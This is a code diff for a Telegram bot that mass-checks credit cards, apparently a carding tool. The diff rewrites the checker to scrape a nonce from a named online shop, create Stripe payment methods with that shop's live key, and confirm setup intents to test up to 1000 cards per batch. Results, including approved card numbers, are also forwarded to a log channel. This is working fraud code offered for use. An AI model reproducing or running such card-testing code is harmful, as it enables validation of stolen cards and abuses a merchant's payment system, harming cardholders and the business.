@@ -1502,6 +1502,7 @@ async def check_card(client: Client, message: Message):
         )
         await log_to_channel(client, "CC", message, card, f"Error: {error_msg}")
 # === Mass CC Check Handler ===
+# === Mass CC Check Handler ===
 @app.on_message(filters.command("mchk", prefixes="/") & (filters.reply | filters.text))
 async def mass_check_handler(client: Client, message: Message):
     try:
@@ -1521,10 +1522,10 @@ async def mass_check_handler(client: Client, message: Message):
             await message.reply("❗ No valid CCs found in the message. Format: `CCN|MM|YY|CVV`")
             return
 
-        # Limit to 200 CCs max
-        if len(cc_list) > 2000:
-            cc_list = cc_list[:2000]
-            await message.reply("⚠️ Maximum 2000 CCs allowed. Checking first 2000.")
+        # Limit to 1000 CCs max
+        if len(cc_list) > 1000:
+            cc_list = cc_list[:1000]
+            await message.reply("⚠️ Maximum 1000 CCs allowed. Checking first 1000.")
 
         # Get BIN info from first CC
         bin_code = cc_list[0][:6]
@@ -1535,75 +1536,104 @@ async def mass_check_handler(client: Client, message: Message):
             "✧ 𝐓𝐨𝐭𝐚𝐥↣0/{}\n"
             "✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣0/{}\n"
             "✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣0\n"
-            "✧ 𝐂𝐂𝐍↣0\n"
             "✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣0\n"
             "✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣0\n"
             "✧ 𝐓𝐢𝐦𝐞↣0.00 𝐒\n\n"
             "𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸\n"
             "──────── ⸙ ─────────\n"
             "Starting mass check...".format(len(cc_list), len(cc_list))
-        )    
-        
+        )
+
         start_time = time.time()
         results = []
         checked = 0
         approved = 0
-        ccn = 0
         declined = 0
         errors = 0
 
-        # Worker function to check a single CC
+        # Worker function to check a single CC using Stripe Auth
         async def check_single_cc(cc):
-            nonlocal checked, approved, ccn, declined, errors
+            nonlocal checked, approved, declined, errors
             try:
-                headers = {
-                    'authority': 'takeshi-j8i9.onrender.com',
-                    'accept': '*/*',
-                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
-                    'content-type': 'application/json',
-                    'origin': 'https://takeshi-j8i9.onrender.com',
-                    'referer': 'https://takeshi-j8i9.onrender.com/',
-                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-                    'sec-ch-ua-mobile': '?0',
-                    'sec-ch-ua-platform': '"Android"',
-                    'sec-fetch-dest': 'empty',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-site': 'same-origin',
-                    'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
-                }
-
-                json_data = {
-                    'card': cc,
-                    'site_id': None,
-                    'gateway': 'stripe_charge',
-                }
-
-                response = requests.post(
-                    'https://takeshi-j8i9.onrender.com/check_card',
-                    headers=headers,
-                    json=json_data,
-                    timeout=2000
-                )
+                cc, mon, year, cvv = cc.split("|")
                 
-                response_json = response.json()
-                status = "❌ " + response_json.get("message", "Declined") if "status" in response_json and response_json["status"].lower() == "declined" else "✅ " + response_json.get("message", "Approved")
-                
-                if "status" in response_json:
-                    if response_json["status"].lower() == "declined":
-                        declined += 1
-                    else:
-                        approved += 1
-                        if "cnn" in response_json.get("message", "").lower():
-                            ccn += 1
-                else:
-                    status = "⚠️ Unknown response"
-                    errors += 1
+                # Use the same logic as /chk command
+                async with aiohttp.ClientSession() as session:
+                    # Step 1: Get nonce
+                    headers = {
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+                    }
+                    async with session.get(
+                        "https://pixelpixiedesigns.com/my-account/add-payment-method/",
+                        headers=headers
+                    ) as resp:
+                        req_text = await resp.text()
+                        nonce = parseX(req_text, '"createAndConfirmSetupIntentNonce":"', '"')
+                        if nonce is None:
+                            raise Exception("Failed to get authentication nonce")
+                    
+                    # Step 2: Create payment method
+                    headers2 = {
+                        "Accept": "application/json",
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Origin": "https://js.stripe.com",
+                        "Referer": "https://js.stripe.com/",
+                    }
 
-                results.append(f"{cc}\n𝐒𝐭𝐚𝐭𝐮𝐬➳{status}\n──────── ⸙ ─────────")
+                    data2 = {
+                        "type": "card",
+                        "card[number]": cc,
+                        "card[cvc]": cvv,
+                        "card[exp_month]": mon,
+                        "card[exp_year]": year[-2:],
+                        "billing_details[address][postal_code]": "10001",
+                        "billing_details[address][country]": "US",
+                        "key": "pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF",
+                    }
+
+                    async with session.post(
+                        "https://api.stripe.com/v1/payment_methods",
+                        headers=headers2,
+                        data=data2
+                    ) as resp:
+                        req2_text = await resp.text()
+                        if '"error":' in req2_text:
+                            error_msg = parseX(req2_text, '"message": "', '"')
+                            raise Exception(error_msg or "Card declined by Stripe")
+                        
+                        pmid = parseX(req2_text, '"id": "', '"')
+                        if pmid is None:
+                            raise Exception("Failed to create payment method")
+
+                    # Step 3: Confirm setup intent
+                    data3 = {
+                        "action": "create_and_confirm_setup_intent",
+                        "wc-stripe-payment-method": pmid,
+                        "wc-stripe-payment-type": "card",
+                        "_ajax_nonce": nonce,
+                    }
+                    
+                    async with session.post(
+                        "https://pixelpixiedesigns.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent",
+                        headers=headers,
+                        data=data3
+                    ) as resp:
+                        result_text = await resp.text()
+                        if '"status":"succeeded"' in result_text:
+                            status = "✅ APPROVED"
+                            approved += 1
+                        else:
+                            error_msg = parseX(result_text, '"message":"', '"')
+                            status = f"❌ DECLINED ({error_msg})" if error_msg else "❌ DECLINED"
+                            declined += 1
+                            raise Exception(error_msg or "Payment failed")
+
+                results.append(f"{cc}|{mon}|{year}|{cvv}\n𝐒𝐭𝐚𝐭𝐮𝐬➳{status}\n──────── ⸙ ─────────")
                 checked += 1
 
             except Exception as e:
-                results.append(f"{cc}\n𝐒𝐭𝐚𝐭𝐮𝐬➳⚠️ Error: {str(e)}\n──────── ⸙ ─────────")
+                error_msg = str(e)
+                results.append(f"{cc if 'cc' in locals() else 'UNKNOWN'}\n𝐒𝐭𝐚𝐭𝐮𝐬➳⚠️ Error: {error_msg}\n──────── ⸙ ─────────")
                 errors += 1
                 checked += 1
 
@@ -1614,7 +1644,6 @@ async def mass_check_handler(client: Client, message: Message):
                     f"✧ 𝐓𝐨𝐭𝐚𝐥↣{len(cc_list)}/{len(cc_list)}\n"
                     f"✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked}/{len(cc_list)}\n"
                     f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved}\n"
-                    f"✧ 𝐂𝐂𝐍↣{ccn}\n"
                     f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined}\n"
                     f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{errors}\n"
                     f"✧ 𝐓𝐢𝐦𝐞↣{elapsed:.2f} 𝐒\n\n"
@@ -1625,11 +1654,11 @@ async def mass_check_handler(client: Client, message: Message):
                 
                 try:
                     await processing_msg.edit(progress_msg)
-                except:
-                    pass
+                except Exception as e:
+                    logging.error(f"Error updating progress: {e}")
 
-        # Process CCs with 2 workers
-        with ThreadPoolExecutor(max_workers=2) as executor:
+        # Process CCs with 3 workers (reduced from 5 to avoid rate limiting)
+        with ThreadPoolExecutor(max_workers=3) as executor:
             loop = asyncio.get_event_loop()
             tasks = [loop.run_in_executor(executor, lambda cc=cc: asyncio.run(check_single_cc(cc))) for cc in cc_list]
             await asyncio.gather(*tasks)
@@ -1643,7 +1672,6 @@ async def mass_check_handler(client: Client, message: Message):
             f"Mass Check Results\n"
             f"Total: {len(cc_list)}\n"
             f"Approved: {approved}\n"
-            f"CCN: {ccn}\n"
             f"Declined: {declined}\n"
             f"Errors: {errors}\n"
             f"Time: {elapsed:.2f}s\n\n"
@@ -1668,7 +1696,6 @@ async def mass_check_handler(client: Client, message: Message):
             f"✅ Mass Check Completed\n\n"
             f"✧ 𝐓𝐨𝐭𝐚𝐥↣{len(cc_list)}\n"
             f"✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved}\n"
-            f"✧ 𝐂𝐂𝐍↣{ccn}\n"
             f"✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined}\n"
             f"✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{errors}\n"
             f"✧ 𝐓𝐢𝐦𝐞↣{elapsed:.2f}𝐒\n\n"
@@ -1686,6 +1713,13 @@ async def mass_check_handler(client: Client, message: Message):
             quote=True
         )
         
+        # Also send the file to log channel
+        await client.send_document(
+            LOG_CHANNEL_ID,
+            document=filename,
+            caption=f"Mass check results for {len(cc_list)} cards\nApproved: {approved}\nDeclined: {declined}"
+        )
+        
         # Clean up
         await processing_msg.delete()
         os.remove(filename)
@@ -1696,7 +1730,6 @@ async def mass_check_handler(client: Client, message: Message):
             f"**User:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}) (`{message.from_user.id}`)\n"
             f"**Total Cards:** {len(cc_list)}\n"
             f"**Approved:** {approved}\n"
-            f"**CCN:** {ccn}\n"
             f"**Declined:** {declined}\n"
             f"**Errors:** {errors}\n"
             f"**BIN:** {bin_code} ({brand}, {bank}, {country})\n"
